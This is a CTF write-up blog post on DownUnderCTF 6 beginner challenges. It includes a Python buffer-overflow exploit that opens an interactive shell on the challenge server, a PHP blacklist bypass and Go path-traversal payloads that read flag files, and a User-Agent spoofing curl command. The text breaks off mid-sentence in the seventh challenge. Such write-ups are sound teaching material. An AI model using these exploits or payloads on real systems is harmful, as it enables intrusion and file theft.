<div class="profile-wrapper">

<a href="/" id="avatar" class="rounded-circle"><img
src="/assets/img/pfp.jpeg" onerror="this.style.display=&#39;none&#39;"
width="112" height="112" alt="avatar" /></a>
<a href="/" class="site-title d-block">K4YR0's Security Blog</a>

CTF Writeups, Walkthroughs & Security Research

</div>

- <a href="/" class="nav-link"><em></em> <span>HOME</span></a>
- <a href="/categories/" class="nav-link"><em></em>
  <span>CATEGORIES</span></a>
- <a href="/tags/" class="nav-link"><em></em> <span>TAGS</span></a>
- <a href="/archives/" class="nav-link"><em></em>
  <span>ARCHIVES</span></a>
- <a href="/about/" class="nav-link"><em></em> <span>ABOUT</span></a>
- <a href="/portfolio/" class="nav-link"><em></em>
  <span>PORTFOLIO</span></a>

<div class="sidebar-bottom d-flex flex-wrap align-items-center w-100">

<span class="icon-border"></span>
<a href="https://github.com/K4YR0" aria-label="github" target="_blank"
rel="noopener noreferrer"><em></em></a>
<a href="https://twitter.com/k4yr0x64" aria-label="twitter"
target="_blank" rel="noopener noreferrer"><em></em></a> <a
href="javascript:location.href%20=%20&#39;mailto:&#39;%20+%20%5B&#39;k4yr0x64&#39;,&#39;google.com&#39;%5D.join(&#39;@&#39;)"
aria-label="email"><em></em></a>
<a href="https://www.linkedin.com/in/belagraa-zakariyae/"
aria-label="linkedin" target="_blank"
rel="noopener noreferrer"><em></em></a>

</div>

<div id="main-wrapper" class="d-flex justify-content-center">

<div class="container d-flex flex-column px-xxl-5">

<div id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">

<div id="topbar"
class="d-flex align-items-center justify-content-between px-lg-3 h-100">

[Home](/) DownUnderCTF 6 Complete Writeup - All Categories

<div id="topbar-title">

Post

</div>

Cancel

</div>

</div>

<div class="row flex-grow-1">

<div class="col-12 col-lg-11 col-xl-9 px-md-4" role="main"
aria-label="Main Content">

<div>

# DownUnderCTF 6 Complete Writeup - All Categories

<div class="post-meta text-muted">

Posted Jul 20, 2025

<div class="mt-3 mb-3">

<a href="/assets/img/posts/DUCTF6-banner.png"
class="popup img-link preview-img shimmer"><img
src="/assets/img/posts/DUCTF6-banner.png" loading="lazy" width="1200"
height="630" alt="DownUnderCTF 6 Complete Writeup" /></a>

DownUnderCTF 6 Complete Writeup

</div>

<div class="d-flex justify-content-between">

By *[K4YR0](https://k4yr0.github.io/)*

<div>

<span class="readtime" bs-toggle="tooltip" bs-placement="bottom"
title="13106 words"> *72 min* read</span>

</div>

</div>

</div>

</div>

<div id="toc-bar"
class="d-flex align-items-center justify-content-between invisible">

<span class="label text-truncate">DownUnderCTF 6 Complete Writeup - All
Categories</span>

</div>

<span class="label ps-2 pe-1">Contents</span>

<div class="header d-flex flex-row align-items-center justify-content-between">

<div class="label text-truncate py-2 ms-4">

DownUnderCTF 6 Complete Writeup - All Categories

</div>

</div>

<div id="toc-popup-content" class="px-4 py-3 pb-4">

</div>

<div class="content">

> **Note:** This writeup documents my personal experience solving
> challenges during DownUnderCTF 6. All content is for educational
> purposes only.

## <span class="me-2">Introduction</span><a href="#introduction" class="anchor text-muted"><em></em></a>

DownUnderCTF 6 was an engaging and well-organized 48-hour CTF featuring
a wide range of challenges across various categories. This writeup
covers my solutions to 27 out of 64 challenges, primarily ranging from
beginner to easy difficulty, with a few at the medium level.

**Competition Duration:** 48 Hours  
**Team Placement:** 116 (solo participant in a team)  
**Challenges Solved:** 27/64  
**Final Score:** 2848

------------------------------------------------------------------------

## <span class="me-2">📚 Beginner Challenges</span><a href="#-beginner-challenges" class="anchor text-muted"><em></em></a>

### <span class="me-2">Challenge 1: Zeus</span><a href="#challenge-1-zeus" class="anchor text-muted"><em></em></a>

**Solves:** 1053  
**Category:** Beginner / Reverse Engineering

#### <span class="me-2">Description</span><a href="#description" class="anchor text-muted"><em></em></a>

> To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer
> our praise, we make you welcome!

#### <span class="me-2">Solve</span><a href="#solve" class="anchor text-muted"><em></em></a>

We are given an ELF binary named `zeus`:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
```

    $ file zeus
    zeus: ELF 64-bit LSB pie executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped

    $ ./zeus
    The northern winds are silent...

</div>

</div>

Running the binary with no arguments does nothing useful.

Opening it in **Ghidra**, we find that the program checks for two
arguments:

1.  `-invocation`
2.  A specific string:  
    `"To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer our praise, we make you welcome!"`

If both arguments match, the binary executes this logic:

<div class="language-c highlighter-rouge">

<div class="code-header">

<span label-text="C"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
```

    puts("Zeus responds to your invocation!");
    xor(&local_98, "Maimaktes1337");
    printf("His reply: %s\n", &local_98);

</div>

</div>

The encrypted message is made up of these hex values stored in
variables:

<div class="language-c highlighter-rouge">

<div class="code-header">

<span label-text="C"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
```

    local_58 = 0xc1f1027392a3409;
    local_50 = 0x11512515c6c561d;
    local_48 = 0x5a411e1c18043e08;
    local_40 = 0x3412090606125952;
    local_38 = 0x12535c546e170b15;
    local_30 = 0x3a110315320f0e;
    uStack_29 = 0x4e4a5a00;

</div>

</div>

We decrypt them using a script like this:

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
```

    import struct

    hex_values = [
        0xc1f1027392a3409,
        0x11512515c6c561d,
        0x5a411e1c18043e08,
        0x3412090606125952,
        0x12535c546e170b15,
        0x3a110315320f0e,
        0x4e4a5a00
    ]

    data = b''
    for val in hex_values:
        size = (val.bit_length() + 7) // 8
        data += struct.pack('<Q', val)[:size]

    key = b"Maimaktes1337"
    result = bytearray()

    for i in range(len(data)):
        result.append(data[i] ^ key[i % len(key)])

    print(result.decode())

</div>

</div>

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    DUCTF{king_of_the_olympian_gods_and_god_of_the_sky}

</div>

</div>

**Flag:** `DUCTF{king_of_the_olympian_gods_and_god_of_the_sky}`

<a href="/assets/img/posts/DUCTF/zeus.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/zeus.gif" loading="lazy"
alt="Zeus throwing lightning bolts" /></a>

### <span class="me-2">Challenge 2: Kick the Bucket</span><a href="#challenge-2-kick-the-bucket"
class="anchor text-muted"><em></em></a>

**Solves:** 819  
**Category:** Beginner / Cloud

#### <span class="me-2">Description</span><a href="#description-1" class="anchor text-muted"><em></em></a>

> In this challenge, CI/CD pipelines and Terraform manage AWS resources.
> Part of the infrastructure includes an S3 bucket that stores files and
> configuration. To prevent misuse, access to the bucket is restricted
> only to Terraform, and time-limited access is provided via **S3
> presigned URLs**.
>
> Your goal:  
> Given a presigned URL for `flag.txt` and the S3 bucket resource
> policy, figure out how to retrieve the flag.

#### <span class="me-2">Provided files</span><a href="#provided-files" class="anchor text-muted"><em></em></a>

##### <span class="me-2">s3_presigned_url.txt</span><a href="#s3_presigned_urltxt" class="anchor text-muted"><em></em></a>

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    https://kickme-95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXC42U7VJ7MRP6INU%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b

</div>

</div>

##### <span class="me-2">s3_resource_policy.txt</span><a href="#s3_resource_policytxt" class="anchor text-muted"><em></em></a>

<div class="language-json highlighter-rouge">

<div class="code-header">

<span label-text="JSON"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
```

    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Allow",
          "Action": "s3:GetObject",
          "Resource": [
            "arn:aws:s3:::kickme-95f596ff5b61453187fbc1c9faa3052e/flag.txt",
            "arn:aws:s3:::kickme-95f596ff5b61453187fbc1c9faa3052e"
          ],
          "Principal": {
            "AWS": "arn:aws:iam::487266254163:user/pipeline"
          },
          "Condition": {
            "StringLike": {
              "aws:UserAgent": "aws-sdk-go*"
            }
          }
        }
      ]
    }

</div>

</div>

#### <span class="me-2">Solution</span><a href="#solution" class="anchor text-muted"><em></em></a>

The presigned URL grants access to `flag.txt`, but the S3 bucket policy
restricts `s3:GetObject` permission to a specific IAM user (`pipeline`)
**and** requires the request to include a `User-Agent` header matching
`aws-sdk-go*`.

To retrieve the flag:

1.  Use the presigned URL with a HTTP client.
2.  Set the `User-Agent` header to a value starting with `aws-sdk-go`,
    e.g., `"aws-sdk-go/1.0"`.
3.  The bucket policy will allow the request, and the presigned URL will
    authenticate it.

Example command:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    curl -A "aws-sdk-go/1.0" "https://kickme-95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXC42U7VJ7MRP6INU%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b"

</div>

</div>

This returns:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    DUCTF{youtube.com/watch?v=A20QQSZsv4E}

</div>

</div>

**Flag:** `DUCTF{youtube.com/watch?v=A20QQSZsv4E}`

<a href="/assets/img/posts/DUCTF/kick.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/kick.gif" loading="lazy"
alt="a kick !!!" /></a>

### <span class="me-2">Challenge 3: Philtered</span><a href="#challenge-3-philtered" class="anchor text-muted"><em></em></a>

**Solves:** 760  
**Category:** Beginner / Web

#### <span class="me-2">Description</span><a href="#description-2" class="anchor text-muted"><em></em></a>

> Can you phigure this one out?

You are given a web application with the following file structure:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
```

    .
    ├── challenge
    │   ├── aboutus.php
    │   ├── contact.php
    │   ├── data
    │   │   ├── aboutus.txt
    │   │   ├── information.txt
    │   │   ├── our-values.txt
    │   │   └── philtered.txt
    │   ├── flag.php
    │   ├── gallery.php
    │   ├── index.php
    │   └── layout.php
    └── Dockerfile

</div>

</div>

The `index.php` script loads files dynamically based on GET parameters
but filters out certain blacklisted terms such as `"php"`, `"filter"`,
`"flag"`, `".."`, and path separators to prevent unsafe file access.

#### <span class="me-2">Screenshot of main site</span><a href="#screenshot-of-main-site"
class="anchor text-muted"><em></em></a>

<a href="/assets/img/posts/DUCTF/philtered.png"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/philtered.png" loading="lazy"
alt="Main Site Screenshot" /></a>

#### <span class="me-2">Provided code snippet (`index.php`):</span><a href="#provided-code-snippet-indexphp"
class="anchor text-muted"><em></em></a>

<div class="language-php highlighter-rouge">

<div class="code-header">

<span label-text="PHP"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
```

    <?php

    class Config {
        public $path = 'information.txt';
        public $data_folder = 'data/';
    }

    class FileLoader {
        public $config;
        public $allow_unsafe = false;
        public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\'];
        
        public function __construct() {
            $this->config = new Config();
        }
        
        public function contains_blacklisted_term($value) {
            if (!$this->allow_unsafe) {
                foreach ($this->blacklist as $term) {
                    if (stripos($value, $term) !== false) {
                        return true;    
                    }
                }
            }
            return false;
        }

        public function assign_props($input) {
            foreach ($input as $key => $value) {
                if (is_array($value) && isset($this->$key)) {
                    foreach ($value as $subKey => $subValue) {
                        if (property_exists($this->$key, $subKey)) {
                            if ($this->contains_blacklisted_term($subValue)) {
                                $subValue = 'philtered.txt';
                            }
                            $this->$key->$subKey = $subValue;
                        }
                    }
                } else if (property_exists($this, $key)) {
                    if ($this->contains_blacklisted_term($value)) {
                        $value = 'philtered.txt';
                    }
                    $this->$key = $value;
                }
            }
        }

        public function load() {
            return file_get_contents($this->config->data_folder . $this->config->path);
        }
    }

    $loader = new FileLoader(); 
    $loader->assign_props($_GET);

    require_once __DIR__ . '/layout.php';

    $content = <<<HTML
    <nav style="margin-bottom:2em;">
        <a href="index.php">Home</a> |
        <a href="aboutus.php">About Us</a> |
        <a href="contact.php">Contact</a> |
        <a href="gallery.php">Gallery</a>
    </nav>
    <h2>Welcome to Philtered</h2>
    HTML;

    $content .= "<p>" . $loader->load() . "</p>";

    $content .= "<h3>About Us</h3>";
    $loader->config->path = 'aboutus.txt';
    $content .= "<p>" . $loader->load() . "</p>";

    $content .= "<h3>Our Values</h3>";
    $loader->config->path = 'our-values.txt';
    $content .= "<p>" . $loader->load() . "</p>";

    $content .= <<<HTML
    <h3>Contact</h3>
    <ul>
        <li>Email: info</li>
        <li>Please don't talk to us, we don't like it</li>
    </ul>
    HTML;

    render_layout('Philtered - Home', $content);
    ?>

</div>

</div>

#### <span class="me-2">Solve</span><a href="#solve-1" class="anchor text-muted"><em></em></a>

By default, the application blocks paths containing blacklisted terms
(including `"php"`, `"flag"`, `".."`, and so on) **unless** the GET
parameter `allow_unsafe` is set to `true`.

This disables the blacklist, allowing you to set the config path to
`../flag.php` and read the file contents:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    https://[challenge-url]/index.php?allow_unsafe=true&config[path]=../flag.php

</div>

</div>

The app will display the contents of `flag.php` without executing it. By
viewing the page source, you will find the flag embedded in the PHP
code:

<div class="language-php highlighter-rouge">

<div class="code-header">

<span label-text="PHP"></span>

</div>

<div class="highlight">

``` lineno
1
```

    <?php $flag = 'DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}'; ?>

</div>

</div>

**Flag:** `DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}`

<a href="/assets/img/posts/DUCTF/sneaky.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/sneaky.gif" loading="lazy"
alt="sneaky hehehe" /></a>

### <span class="me-2">Challenge 4: corporate-cliche</span><a href="#challenge-4-corporate-cliche"
class="anchor text-muted"><em></em></a>

**Solves:** 499  
**Category:** Beginner / pwn

#### <span class="me-2">Description</span><a href="#description-3" class="anchor text-muted"><em></em></a>

> It’s time to really push the envelope and go above and beyond! We’ve
> got a new challenge for you. Can you find a way to get into our email
> server?

#### <span class="me-2">Files Provided</span><a href="#files-provided" class="anchor text-muted"><em></em></a>

- `email_server` (binary)
- `email_server.c` (source code)

#### <span class="me-2">Source Code (`email_server.c`)</span><a href="#source-code-email_serverc"
class="anchor text-muted"><em></em></a>

<div class="language-c highlighter-rouge">

<div class="code-header">

<span label-text="C"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
```

    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    void open_admin_session() {
        printf("-> Admin login successful. Opening shell...\n");
        system("/bin/sh");
        exit(0);
    }

    void print_email() {
        printf(" ______________________________________________________________________\n");
        printf("| To:      all-staff@downunderctf.com                                  |\n");
        printf("| From:    synergy-master@downunderctf.com                             |\n");
        printf("| Subject: Action Item: Leveraging Synergies                           |\n");
        printf("|______________________________________________________________________|\n");
        printf("|                                                                      |\n");
        printf("| Per my last communication, I'm just circling back to action the      |\n");
        printf("| sending of this email to leverage our synergies. Let's touch base    |\n");
        printf("| offline to drill down on the key takeaways and ensure we are all     |\n");
        printf("| aligned on this new paradigm. Moving forward, we need to think       |\n");
        printf("| outside the box to optimize our workflow and get the ball rolling.   |\n");
        printf("|                                                                      |\n");
        printf("| Best,                                                                |\n");
        printf("| A. Manager                                                           |\n");
        printf("|______________________________________________________________________|\n");
        exit(0);
    }

    const char* logins[][2] = {
        {"admin", "🇦🇩🇲🇮🇳"},
        {"guest", "guest"},
    };

    int main() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);

        char password[32];
        char username[32];

        printf("┌──────────────────────────────────────┐\n");
        printf("│      Secure Email System v1.337      │\n");
        printf("└──────────────────────────────────────┘\n\n");

        printf("Enter your username: ");
        fgets(username, sizeof(username), stdin);
        username[strcspn(username, "\n")] = 0;

        if (strcmp(username, "admin") == 0) {
            printf("-> Admin login is disabled. Access denied.\n");
            exit(0);
        }

        printf("Enter your password: ");
        gets(password);

        for (int i = 0; i < sizeof(logins) / sizeof(logins[0]); i++) {
            if (strcmp(username, logins[i][0]) == 0) {
                if (strcmp(password, logins[i][1]) == 0) {
                    printf("-> Password correct. Access granted.\n");
                    if (strcmp(username, "admin") == 0) {
                        open_admin_session();
                    } else {
                        print_email();
                    }
                } else {
                    printf("-> Incorrect password for user '%s'. Access denied.\n", username);
                    exit(1);
                }
            }
        }
        printf("-> Login failed. User '%s' not recognized.\n", username);
        exit(1);
    }

</div>

</div>

#### <span class="me-2">Analysis</span><a href="#analysis" class="anchor text-muted"><em></em></a>

The program disables admin login by rejecting the username `admin`
upfront. However, the password buffer is read using unsafe `gets()`,
which allows buffer overflow.

By carefully overflowing the `password` buffer and overwriting the
`username` buffer in memory, we can bypass the username check by
overwriting the username from `guest` to `admin`.

The admin password is the Unicode emoji string `🇦🇩🇲🇮🇳` (UTF-8 encoded),
which must be placed correctly in the overflow payload.

Key vulnerabilities:

1.  `gets(password)` allows buffer overflow
2.  Username check happens before password input
3.  Memory layout allows overwriting username buffer from password
    buffer

#### <span class="me-2">Solve</span><a href="#solve-2" class="anchor text-muted"><em></em></a>

We can exploit this by using a buffer overflow attack. The strategy is:

1.  Enter `guest` as username to bypass the initial admin check
2.  Craft a payload that overflows the password buffer to overwrite the
    username buffer with “admin”
3.  Include the correct admin password at the start of our payload

**Exploit Script:**

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
```

    #!/usr/bin/env python3
    import socket
    import time

    def exploit():
        # Connect to the challenge server
        host = "chal.2025.ductf.net"
        port = 30000
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Receive the banner
        banner = s.recv(1024)
        print("Banner:", banner.decode())
        
        # Send username (any username, we'll overwrite it)
        username = "guest"
        s.send((username + "\n").encode())
        
        # Receive password prompt
        prompt = s.recv(1024)
        print("Prompt:", prompt.decode())
        
        # Craft the payload
        admin_password = "🇦🇩🇲🇮🇳"  # The admin password from the code
        admin_password_bytes = admin_password.encode('utf-8')
        
        print(f"Admin password bytes: {len(admin_password_bytes)} bytes")
        print(f"Admin password: {admin_password_bytes}")
        
        # Strategy:
        # 1. Put correct password at start with null terminator
        # 2. Fill remaining space in password buffer with padding
        # 3. Overwrite username buffer with "admin\x00"
        
        payload_bytes = admin_password_bytes  # Start with password bytes
        payload_bytes += b"\x00"  # Null terminate the password
        remaining_space = 32 - len(admin_password_bytes) - 1  # Account for null terminator
        payload_bytes += b"A" * remaining_space  # Fill exactly to 32 bytes
        payload_bytes += b"admin\x00"  # Overwrite username
        
        print(f"Total payload length: {len(payload_bytes)} bytes")
        
        s.send(payload_bytes + b"\n")
        
        # Check if we got shell access
        response = s.recv(1024)
        print("Response:", response.decode())
        
        if b"Admin login successful" in response:
            print("Exploit successful! You should have shell access now.")
            
            # Interactive shell
            while True:
                try:
                    s.settimeout(1)
                    data = s.recv(1024)
                    if data:
                        print(data.decode(), end='')
                except socket.timeout:
                    pass
                
                try:
                    cmd = input()
                    s.send((cmd + "\n").encode())
                except KeyboardInterrupt:
                    break
        else:
            print("Exploit failed. Response:", response.decode())
        
        s.close()

    if __name__ == "__main__":
        exploit()

</div>

</div>

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
```

    Banner: 
    ┌──────────────────────────────────────┐
    │      Secure Email System v1.337      │
    └──────────────────────────────────────┘

    Prompt: Enter your username: Enter your password: 
    Admin password bytes: 20 bytes
    Admin password: b'\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3'
    Total payload length: 38 bytes
    Response: -> Admin login successful. Opening shell...

    Exploit successful! You should have shell access now.
    $ cat flag.txt
    DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}

</div>

</div>

**Flag:**
`DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}`

<a href="/assets/img/posts/DUCTF/bufferoverflow.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/bufferoverflow.gif" loading="lazy"
alt="buffer overflow" /></a>

### <span class="me-2">Challenge 5: our-lonely-dog</span><a href="#challenge-5-our-lonely-dog"
class="anchor text-muted"><em></em></a>

**Solves:** 426  
**Category:** Beginner / Misc

#### <span class="me-2">Description</span><a href="#description-4" class="anchor text-muted"><em></em></a>

> e-dog has been alone in the downunderctf.com email server for so long,
> please yeet him an email of some of your pets to keep him company, he
> might even share his favourite toy with you. He has a knack for hiding
> things one layer deeper than you would expect.

#### <span class="me-2">Analysis</span><a href="#analysis-1" class="anchor text-muted"><em></em></a>

From the challenge description, we need to:

1.  Find e-dog’s email address
2.  Send him an email
3.  Look for hidden information in his response

The hint “He has a knack for hiding things one layer deeper than you
would expect” suggests we need to look beyond the visible email content.

#### <span class="me-2">Solve</span><a href="#solve-3" class="anchor text-muted"><em></em></a>

**Step 1: Finding the Email Address**

Based on the challenge description mentioning “downunderctf.com email
server”, we can guess that e-dog’s email address is:
`e-dog@downunderctf.com`

**Step 2: Sending an Email**

We send an email to `e-dog@downunderctf.com`. The subject and content
can be anything - it doesn’t actually need to be related to pets despite
what the description suggests.

**Step 3: Analyzing the Response**

E-dog responds with an automated message:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    Hi, E-dog gets quite pupset when they can't find their bone, especially when it's been a ruff day. Maybe we need to pull out a new one for them?

</div>

</div>

However, this is the same response regardless of what we send. The hint
about “one layer deeper” suggests we need to examine the email headers
rather than just the visible content.

**Step 4: Examining Email Headers**

When we check the full email headers of e-dog’s response, we find:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    X-FLAG: DUCTF{g00d-luCk-G3tT1nG-ThR0uGh-Al1s-Th3-eM41Ls}

</div>

</div>

The flag is hidden in a custom email header `X-FLAG`, which is “one
layer deeper” than the visible email content.

**Flag:** `DUCTF{g00d-luCk-G3tT1nG-ThR0uGh-Al1s-Th3-eM41Ls}`

<a href="/assets/img/posts/DUCTF/dog.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/dog.gif" loading="lazy" alt="doggy" /></a>

### <span class="me-2">Challenge 6: secure-email-attachments</span><a href="#challenge-6-secure-email-attachments"
class="anchor text-muted"><em></em></a>

**Solves:** 324  
**Category:** Beginner / web

#### <span class="me-2">Description</span><a href="#description-5" class="anchor text-muted"><em></em></a>

> During the email apocalypse, IT admins tried to prevent the DOS of all
> systems by disallowing attachments to emails. To get around this,
> users would create their own file storage web servers for hosting
> their attachments, which also got DOSed because everyone was mass
> spamming the links in emails… \*Can you read \*`/etc/flag.txt` from
> the filesystem?

#### <span class="me-2">Files Provided</span><a href="#files-provided-1" class="anchor text-muted"><em></em></a>

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
```

    .
    ├── app
    │   ├── attachments
    │   │   └── the-fat-monke.jpg
    │   ├── flag.txt
    │   ├── go.mod
    │   ├── go.sum
    │   └── main.go
    ├── docker-compose.yml
    └── Dockerfile

</div>

</div>

#### <span class="me-2">Source Code (`main.go`)</span><a href="#source-code-maingo" class="anchor text-muted"><em></em></a>

<div class="language-go highlighter-rouge">

<div class="code-header">

<span label-text="Go"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
```

    package main

    import (
        "net/http"
        "path/filepath"
        "strings"

        "github.com/gin-gonic/gin"
    )

    func main() {
        r := gin.Default()

        r.GET("/*path", func(c *gin.Context) {
            p := c.Param("path")
            if strings.Contains(p, "..") {
                c.AbortWithStatus(400)
                c.String(400, "URL path cannot contain \"..\"")
                return
            }
            // Some people were confused and were putting /attachments in the URLs. This fixes that
            cleanPath := filepath.Join("./attachments", filepath.Clean(strings.ReplaceAll(p, "/attachments", "")))
            http.ServeFile(c.Writer, c.Request, cleanPath)
        })

        r.Run("0.0.0.0:1337")
    }

</div>

</div>

#### <span class="me-2">Analysis</span><a href="#analysis-2" class="anchor text-muted"><em></em></a>

The application has several security mechanisms:

1.  **Path traversal filter**: Blocks URLs containing `".."`
2.  **Path cleaning**: Uses
    `filepath.Join("./attachments", filepath.Clean(...))` to sanitize
    paths
3.  **Attachment path removal**: Removes `/attachments` from the URL
    path with `strings.ReplaceAll(p, "/attachments", "")`

However, there’s a vulnerability in how these protections interact with
each other.

#### <span class="me-2">Vulnerability</span><a href="#vulnerability" class="anchor text-muted"><em></em></a>

The key insight is that the order of operations creates a bypass
opportunity:

1.  The `..` check happens first
2.  Then `/attachments` is removed from the path
3.  Finally `filepath.Clean()` is applied

We can exploit this by:

1.  Using URL encoding to bypass the `..` filter (`%2e` = `.`)
2.  Adding `/attachments` segments that get removed, but leave behind
    path traversal sequences
3.  The remaining path after processing allows directory traversal

#### <span class="me-2">Solve</span><a href="#solve-4" class="anchor text-muted"><em></em></a>

**Payload Construction:**

The goal is to read `/etc/flag.txt`. We need to traverse from
`./attachments/` up to the root and then down to `/etc/flag.txt`.

Our payload:
`/attachments%2e/attachments%2e/%2e/attachments%2e/etc/flag.txt`

**Step-by-step breakdown:**

1.  `/attachments%2e/attachments%2e/%2e/attachments%2e/etc/flag.txt`
2.  After `/attachments` removal: `%2e%2e/%2e%2e/etc/flag.txt`
3.  URL decode `%2e` to `.`: `../../etc/flag.txt`
4.  After `filepath.Clean()`: `../../etc/flag.txt`
5.  Final path: `app/attachments/../../etc/flag.txt` → traverses to
    `/etc/flag.txt`

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    curl "http://chal.2025.ductf.net:30014/attachments%2e/attachments%2e/%2e/attachments%2e/etc/flag.txt"

</div>

</div>

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    DUCTF{w00000000T!!1one!?!ONE_i_ThORt_tH3_p4RtH_w4R_cL34N!!1??}

</div>

</div>

**Flag:**
`DUCTF{w00000000T!!1one!?!ONE_i_ThORt_tH3_p4RtH_w4R_cL34N!!1??}`

<a href="/assets/img/posts/DUCTF/bypass.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/bypass.gif" loading="lazy"
alt="Zeus throwing lightning bolts" /></a>

### <span class="me-2">Challenge 7: Down To Modulate Frequencies!</span><a href="#challenge-7-down-to-modulate-frequencies"
class="anchor text-muted"><em></em></a>

**Solves:** 294  
**Category:** Beginner / Misc

#### <span class="me-2">Description</span><a href="#description-6" class="anchor text-muted"><em></em></a>

> One of the scavengers found an abandonded station still transmitting.
> Its been so long, no one remembers how to decode this old tech, can
> you figure out what was being transmitted? Decode the alphanumeric
> message and wrap it in `DUCTF{}`.

#### <span class="me-2">Files Provided</span><a href="#files-provided-2" class="anchor text-muted"><em></em></a>

- `dtmf.txt` (containing encoded data)

#### <span class="me-2">Analysis</span><a href="#analysis-3" class="anchor text-muted"><em></em></a>

DTMF (Dual-Tone Multi-Frequency) is the signaling system used by
